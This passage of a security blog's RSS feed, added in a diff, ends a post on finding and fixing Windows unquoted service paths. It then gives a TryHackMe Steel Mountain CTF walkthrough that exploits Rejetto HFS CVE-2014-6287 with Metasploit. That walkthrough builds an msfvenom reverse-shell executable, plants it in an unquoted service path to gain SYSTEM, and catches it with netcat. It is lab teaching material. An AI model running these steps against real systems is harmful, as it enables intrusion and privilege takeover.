+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;how-to-fix-it-&quot;&gt;How to fix it ?&lt;/h1&gt;
+
+&lt;p&gt;First of all, run this to see if there is any service with an unquoted path variable.:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;displayname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startmode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;If there is, then press &lt;strong&gt;Win+R&lt;/strong&gt; and type &lt;strong&gt;regedit.exe&lt;/strong&gt;, press enter.
+&lt;br /&gt;In the directory tree, search for the vulnerable service name under:&lt;br /&gt; &lt;strong&gt;Computer\HKEY_LOCAL_MACHINE\SYSTEM
+\ControlSet\Services\{SERVICE NAME}&lt;/strong&gt;.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/31.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Find the &lt;strong&gt;ImagePath&lt;/strong&gt; entry, double click it.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/32.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Change its value by surrounding the string with quotes.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/33.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Run again, this time you should not see any results, you have fixed it:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;wmic&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;displayname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;startmode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Windows\&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findstr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;how-to-prevent-it-&quot;&gt;How to prevent it ?&lt;/h1&gt;
+
+&lt;p&gt;How on the world I can create a safe service ?
+&lt;br /&gt; Simple, when creating a service with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc.exe&lt;/code&gt;, do not pass the parameter for &lt;strong&gt;binpath&lt;/strong&gt; like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files\a folder\b folder\c folder&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Instead, do it like this:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;n&quot;&gt;binpath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Program&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Files\a&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;folder\b&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;folder\c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;folder&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;\&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Enjoy your safely created service.
+&lt;img src=&quot;/assets/img/posts/unquoted-service-path-vulnerability/35.jpg&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 23 Dec 2021 00:59:00 +0000</pubDate>
+        <link>http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</link>
+        <guid isPermaLink="true">http://localhost:4000/2021/12/23/unquoted-service-path-vulnerability/</guid>
+        
+        <category>windows-privesc</category>
+        
+        <category>unqoted-service-path</category>
+        
+        <category>windows</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme Steel Mountain CTF Writeup</title>
+        <description>&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/steelmountain&quot;&gt;&lt;strong&gt;Solve Yourself »&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;The steel mountain is a windows machine. In order to hack into the machine, we are going to exploit  two different 
+vulnerabilities that occur on the system.&lt;/p&gt;
+
+&lt;h1 id=&quot;first-method&quot;&gt;FIRST METHOD&lt;/h1&gt;
+&lt;h2 id=&quot;1-preperation&quot;&gt;1-Preperation&lt;/h2&gt;
+&lt;p&gt;Export the ip address of the machine as a variable for shorthand usage.
+&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export ip={MACHINE IP}&lt;/code&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/2.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;2-enumeration&quot;&gt;2-Enumeration&lt;/h2&gt;
+&lt;p&gt;Let us run Network Mapper (&lt;strong&gt;nmap&lt;/strong&gt;) to discover opened ports and services.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Probe open ports to determine service/version info&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;SYN, half TCP scan&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-O&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Enable OS detection&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T4&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;T{0-5} Set scan speed, higher is faster&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scan all 65536 ports&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Skip host discovery&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-oN&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Write output to a file&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sV -sS -O -T4 -p- {machine IP} -Pn -oN {outputfile}&lt;/code&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/3.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+There is a web server running on port &lt;strong&gt;80&lt;/strong&gt;, let us visit.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/4.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+There is also one more web server is running at port &lt;strong&gt;8080&lt;/strong&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/5.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+If you click on the &lt;strong&gt;HttpFileServer2.3&lt;/strong&gt; link under the &lt;strong&gt;Server Information&lt;/strong&gt; heading, it will redirect you to the following page.
+It seems the HTTP server is being run by &lt;strong&gt;rejetto&lt;/strong&gt;.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/6.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+There is a vulnerablity on the &lt;strong&gt;Rejetto HFS versions 2.3, 2.3a, and 2.3b&lt;/strong&gt;, let’s check.&lt;br /&gt;
+&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287&quot;&gt;&lt;strong&gt;CVE-Database -&amp;gt; Rejetto HFS 2.3&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/251276&quot;&gt;&lt;strong&gt;More detailed explaination&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/7.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;3-exploitation&quot;&gt;3-Exploitation&lt;/h2&gt;
+
+&lt;h3 id=&quot;gaining-access-to-the-system---getting-user-flag&quot;&gt;Gaining Access to the System - Getting User Flag&lt;/h3&gt;
+&lt;p&gt;Launch up your &lt;strong&gt;msfconsole&lt;/strong&gt; and do a search for &lt;strong&gt;CVE-2014-6287&lt;/strong&gt; to see if there is any exploit that we can use.
+There is one with an excellent rank, awesome! Let us use it.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Copy the THM IP with that command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ifconfig | grep -C 1 tun0 | tail -n 1 | awk &apos;{print $2}&apos;&lt;/code&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+-&amp;gt; set RPORT &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt;&lt;br /&gt;-&amp;gt; set RHOST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;machine IP&lt;/code&gt;&lt;br /&gt;-&amp;gt; set LHOST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;your THM IP&lt;/code&gt;&lt;br /&gt;-&amp;gt; exploit&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;RPORT&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The target port (TCP)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;RHOST&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Address of the target&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;LPORT&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The listen port&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+After receiving meterpreter session, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; to get an interactive shell.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+Find the flag under &lt;strong&gt;C:\users\bill\Desktop&lt;/strong&gt; directory.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;escalate-the-privileges---getting-the-root-flag&quot;&gt;Escalate the privileges - Getting the Root flag&lt;/h3&gt;
+
+&lt;p&gt;After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
+permissions against the system. &lt;strong&gt;PowerUp.ps1&lt;/strong&gt; is a program that facilitates fast checks in a windows machine to identify 
+any misconfigurations and privilege escalation possibilities.
+&lt;br /&gt;-&amp;gt; &lt;a href=&quot;../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;Download PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;-&amp;gt; &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;&lt;strong&gt;PowerSploit GitHub Repo&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit&lt;/code&gt; and get back to the &lt;strong&gt;meterpreter&lt;/strong&gt; session.
+&lt;br /&gt;-&amp;gt; Upload the script just as we did before to the machine.
+&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;load powershell&lt;/code&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell_shell&lt;/code&gt;
+&lt;br /&gt;You will get &lt;strong&gt;PowerShell&lt;/strong&gt; this time instead of a regular &lt;strong&gt;cmd prompt&lt;/strong&gt;.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;. .\PowerUp.ps1&lt;/code&gt;
+&lt;br /&gt;-&amp;gt; Run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-AllChecks&lt;/code&gt;
+&lt;br /&gt;&lt;strong&gt;InvokeAllChecks&lt;/strong&gt; will diagnose any detectable vulnerabilities along with their descriptions.
+&lt;br /&gt;&lt;br /&gt;The first result we got is a service called &lt;strong&gt;AdvancedSystemCare9&lt;/strong&gt;, and it has a vulnerability called 
+&lt;strong&gt;Unquoted Service Path&lt;/strong&gt; &lt;a href=&quot;https://krygennn.github.io/posts/unquoted-service-path-vulnerability/&quot;&gt;&lt;strong&gt;-&amp;gt; Read more about it&lt;/strong&gt;&lt;/a&gt;. We will abuse this vulnerability. 
+&lt;br /&gt;&lt;strong&gt;CanRestart&lt;/strong&gt; field means that the current user, in this case, &lt;strong&gt;bill&lt;/strong&gt;, can manually restart the service even though
+the service itself is being run with &lt;strong&gt;LocalSystem&lt;/strong&gt; service account permissions, which has the top-level privileges.
+&lt;br /&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN&quot;&gt;&lt;strong&gt;LocalSystem Service Account&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/14.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Launch up &lt;strong&gt;msfvenom&lt;/strong&gt; to deploy a reverse shell binary.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parameter&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Functionality&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;LHOST&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The IP address that the reverse shell will connect&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;LPORT&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The port that the reverse shell will connect&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Payload to use&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-o&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Name of the file&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-f&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;File type of the output binary&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Full command -&amp;gt; &lt;br /&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe&lt;/code&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; Upload the binary to the target machine.
+&lt;br /&gt;-&amp;gt; Get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell&lt;/code&gt; again.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; Relocate the binary into &lt;strong&gt;C:\Program Files (x86)\IObit&lt;/strong&gt; directory.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/17.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;-&amp;gt; Rename the binary to &lt;strong&gt;Advanced.exe&lt;/strong&gt;.
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Start a &lt;strong&gt;netcat&lt;/strong&gt; listener on your machine with the port that is defined when creating
+the backdoor.
+&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nvlp {SPECIFIED PORT}&lt;/code&gt;
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;After starting a netcat session, restart the service
+&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc stop AdvancedSystemCareService9&lt;/code&gt;
+&lt;br /&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sc start AdvancedSystemCareService9&lt;/code&gt;
+&lt;br /&gt;When the service boots, &lt;strong&gt;Advanced.exe&lt;/strong&gt; backdoor binary will be executed instead of the &lt;strong&gt;ASCService.exe&lt;/strong&gt;. 
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+You can find the root flag &lt;strong&gt;root.txt&lt;/strong&gt; under &lt;strong&gt;C:\Users\Administrator\Desktop&lt;/strong&gt; directory.&lt;/p&gt;
+
+&lt;h1 id=&quot;second-method&quot;&gt;SECOND METHOD&lt;/h1&gt;
+
+&lt;p&gt;In this section, instead of using Metasploit and automatizing the process, we will be doing all those steps manually.&lt;/p&gt;
+
+&lt;h2 id=&quot;1-preperation-1&quot;&gt;1-Preperation&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;-&amp;gt; Copy &lt;strong&gt;Advanced.exe&lt;/strong&gt; or create a new backdoor executable with &lt;strong&gt;msfvenom&lt;/strong&gt; just like before.
+&lt;br /&gt;-&amp;gt; Download &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat&quot;&gt;&lt;strong&gt;winPEAS.bat&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;-&amp;gt; Download static binary &lt;a href=&quot;https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe&quot;&gt;&lt;strong&gt;nc.exe&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;-&amp;gt; Download &lt;a href=&quot;../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1&quot;&gt;&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;&lt;/a&gt; or use the previous one if you downloaded it before.
+&lt;br /&gt;-&amp;gt; Download &lt;a href=&quot;../../assets/documents/tryhackme-steel-mountain-writeup/cve20146287.py&quot;&gt;&lt;strong&gt;CVE-2014-6287.py&lt;/strong&gt;&lt;/a&gt; or from &lt;a href=&quot;https://www.exploit-db.com/exploits/39161&quot;&gt;&lt;strong&gt;Exploitdb&lt;/strong&gt;&lt;/a&gt;
+&lt;br /&gt;&lt;br /&gt;Your directory should look like this
+&lt;br /&gt;&lt;img src=&quot;/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/20.jpg&quot; alt=&quot;&quot; class=&quot;normal&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;2-exploitation&quot;&gt;2-Exploitation&lt;/h2&gt;
+&lt;p&gt;Edit the &lt;strong&gt;cve20146287.py&lt;/strong&gt; file, set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip_addr&lt;/code&gt; field to your THM IP, and set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local_port&lt;/code&gt; to any free port.
